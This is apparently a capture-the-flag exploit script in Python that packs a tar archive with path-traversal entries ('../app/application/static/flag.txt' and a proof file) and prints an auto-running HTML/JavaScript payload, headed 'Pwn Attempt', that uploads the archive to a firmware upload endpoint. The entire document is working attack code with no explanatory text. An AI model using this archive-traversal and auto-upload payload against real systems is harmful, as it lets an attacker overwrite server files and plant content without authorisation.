import os
print(os.popen(
    "cd final_tar_file/workdir && "
    "echo 'This proof was generated on' $(date) > ../app/application/static/upload_proof.txt  &&"
    "tar -czvf test.tar.gz --absolute-names "
        #"../flag.txt "
        #"../app/application/main.py "
        #"../app/application/database.db "
        "../app/application/static/upload_proof.txt "
        "../app/application/static/flag.txt "
        #"../app/application/templates/login.html "
        " &&"
    "cp test.tar.gz /tmp/test.tar.gz"
    ).read())

b64Data = os.popen("cat /tmp/test.tar.gz | base64").read().replace("\n", "")


output = f"""
<h1>Pwn Attempt</h1>
<script>
var b64Data = "{b64Data}";
""" + """

async function sendFile()
{
    var FILENAME = "test.tar.gz"
    
    var ENDPOINT = "http://localhost:1337/api/firmware/upload";
    
    /// Upload file from b64 //////////////////////////
    const byteCharacters = atob(b64Data);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    var blob = new Blob([byteArray], { type: "text/html"});
    
    /*
    var URL = "http://localhost:8000/" + FILENAME;
    let blob = await fetch(URL).then(r => r.blob());
    */
    
    /// Uploading ////////////////////////////////////////////
    var formData = new FormData();
    formData.append("file", blob, FILENAME);
    var request = new XMLHttpRequest();
    request.open("POST", ENDPOINT);
    request.send(formData);
    
}
sendFile()
</script>
"""

print("### Payload #########################################")
print(output)
